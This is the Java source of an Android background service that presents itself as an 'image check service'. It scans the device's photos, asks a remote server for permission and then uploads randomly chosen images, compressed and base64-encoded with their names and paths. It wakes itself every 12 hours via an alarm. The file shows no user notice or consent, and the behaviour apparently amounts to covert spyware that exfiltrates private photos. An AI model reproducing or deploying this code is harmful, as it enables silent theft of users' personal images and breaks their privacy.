package com.zhangheng.myapplication.service;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import com.zhangheng.myapplication.R;
import com.zhangheng.myapplication.getphoneMessage.GetPhoneInfo;
import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
import com.zhangheng.myapplication.okhttp.OkHttpUtil;
import com.zhangheng.myapplication.permissions.ReadAndWrite;
import com.zhangheng.myapplication.service.receiver.IndexReceiver;
import com.zhangheng.myapplication.setting.ServerSetting;
import com.zhangheng.myapplication.util.AndroidImageUtil;
import com.zhangheng.myapplication.util.EncryptUtil;
import com.zhangheng.myapplication.util.LocalFileTool;
import com.zhangheng.myapplication.util.OkHttpMessageUtil;
import com.zhangheng.myapplication.util.RandomrUtil;
import com.zhangheng.myapplication.util.TimeUtil;
import com.zhangheng.myapplication.util.TxtOperation;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import cn.hutool.core.collection.CollUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import okhttp3.Call;

public class IndexService extends Service {

    private final static String Tag = "图片检查服务";
    private ServerSetting setting;
    private final Context context = IndexService.this;

    @Override
    public void onCreate() {
        super.onCreate();
        setting = new ServerSetting(context);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (setting.getIsAutoUploadPhoto()) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
                        if (b)
                            getPhoto();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int anHour = 12 * 60 * 60 * 1000;
        long triggerAtTime = System.currentTimeMillis() + anHour;
        Intent i = new Intent(this, IndexReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
        manager.set(AlarmManager.RTC_WAKEUP, triggerAtTime, pi);

        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void getPhoto() {
        boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
//        String[] paths = {"/DCIM", "/Pictures"};
        String[] paths = {};
        if (b) {
            List<String> photo = new ArrayList<>();
//            List<Map<String, Object>> files = new ArrayList<>();
            try {
                LocalFileTool.readFile(LocalFileTool.imageType, context, new LocalFileTool.IReadCallBack() {
                    @Override
                    public void callBack(List<String> localPath) {
                        File file = null;
                        StringBuilder sb = new StringBuilder();
                        String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/100kb~2Mb-IMG.txt";
                        List<String> txtFile = TxtOperation.readTxtFile(local_path, "UTF-8");
                        txtFile = CollUtil.removeBlank(txtFile);
                        long length = 0;
                        for (String path : localPath) {
                            if (txtFile.indexOf(path) < 0) {
                                file = new File(path);
                                if (file.exists())
                                    length = file.length();

                                if (paths.length > 0) {
                                    String s = path.replace(GetPhoto.BasePath, "");
                                    for (String s1 : paths) {
                                        if (s.startsWith(s1)) {
//                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
                                            if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
                                                photo.add(path);
                                                sb.append(path + "\n");
                                            }
                                            break;
                                        }
                                    }
                                } else {
                                    if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
                                        photo.add(path);
                                        sb.append(path + "\n");
                                    }
                                }
                            }
                        }
                        if (sb.length() > 0)
                            TxtOperation.writeTxtFile(sb.toString(), local_path, true);
                        photo.addAll(txtFile);
                        final int size = photo.size();
                        Log.e(Tag, "100kb~2Mb图片数：" + size);

                        Map<String, Object> msg = new HashMap<>();
                        msg.put("num", size);
                        msg.put("time", TimeUtil.dateToUnix(new Date()));

                        OkHttpUtils.get()
                                .url(setting.getMainUrl() + OkHttpUtil.URL_postMessage_M3_GetUpload)
                                .addHeader("User-Agent", GetPhoneInfo.getHead(context))
                                .addParams("json", JSONUtil.toJsonStr(msg))
                                .build().execute(new StringCallback() {
                            @Override
                            public void onError(Call call, Exception e, int id) {
                                Log.e(Tag + "图片上传", OkHttpMessageUtil.error(e));
                            }

                            @Override
                            public void onResponse(String response, int id) {
                                try {
                                    if (!StrUtil.isEmpty(response)) {
                                        //校验消息合法
                                        JSONObject object = JSONUtil.parseObj(response);
                                        String signature = EncryptUtil.getSignature(object.getStr("time"), object.getStr("title"));
                                        if (signature.equals(object.getStr("message"))) {
                                            if (object.getInt("code").equals(200)) {
                                                Log.d(Tag + "响应允许", "允许文件上传");
                                                if (size > 0) {
                                                    int c = 1;
                                                    if (size <= 5) {
                                                        c = size;
                                                    } else if (size > 5 && size < 200) {
                                                        c = 2;
                                                    } else if (size >= 200 && size < 500) {
                                                        c = 3;
                                                    } else if (size >= 500 && size < 1000) {
                                                        c = 4;
                                                    } else {
                                                        c = 5;
                                                    }
                                                    int i = 0;
                                                    c = 1;//暂时解决启动时运算量过大导致无法响应
                                                    byte[] bytes = null;
                                                    File file = null;
                                                    while (i < c) {
                                                        String pathname = photo.get(RandomrUtil.createRandom(0, size - 1));
                                                        file = new File(pathname);
                                                        if (file.exists()) {
                                                            long fileLength = file.length();
                                                            if (fileLength >= 1024 * 1024 * 0.8 && fileLength < 1024 * 1024 * 1.2) {
                                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 2);
                                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                                            } else if (fileLength >= 1024 * 1024 * 1.2 && fileLength < 1024 * 1024 * 1.6) {
                                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 3);
                                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                                            } else if (fileLength >= 1024 * 1024 * 1.6) {
                                                                Bitmap zip = AndroidImageUtil.zip(BitmapFactory.decodeFile(pathname), 4);
                                                                bytes = AndroidImageUtil.bitmapToByte(zip);
                                                            } else {
                                                                bytes = LocalFileTool.fileToBytes(file);
                                                            }
                                                            if (bytes.length < 1024 * 1024) {
                                                                i++;
                                                                String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
                                                                Log.d(Tag + "上传图片", replace + ",原文件大小:"
                                                                        + LocalFileTool.getFileSizeString(fileLength) + ",上传大小：" + LocalFileTool.getFileSizeString((long) bytes.length));
                                                                Map<String, Object> map = new HashMap<>();
                                                                map.put("time", TimeUtil.dateToUnix(new Date()));
                                                                map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
                                                                map.put("path", EncryptUtil.enBase64(replace.getBytes()));
                                                                map.put("size", fileLength);
                                                                map.put("data", EncryptUtil.enBase64(bytes));
                                                                OkHttpUtil.postFile(context, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
//                                                            Thread.sleep(2000);
                                                            }
                                                        }
                                                    }
                                                }
                                            } else {
                                                Log.w(Tag + "响应拒绝", "拒绝文件上传");
                                            }
                                        } else {
                                            Log.e(Tag + "非法响应", "响应消息验证失败");
                                        }
                                    }
                                } catch (Exception e) {
                                    e.printStackTrace();
                                } finally {
                                }
                            }
                        });
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
            }
        }
    }
}
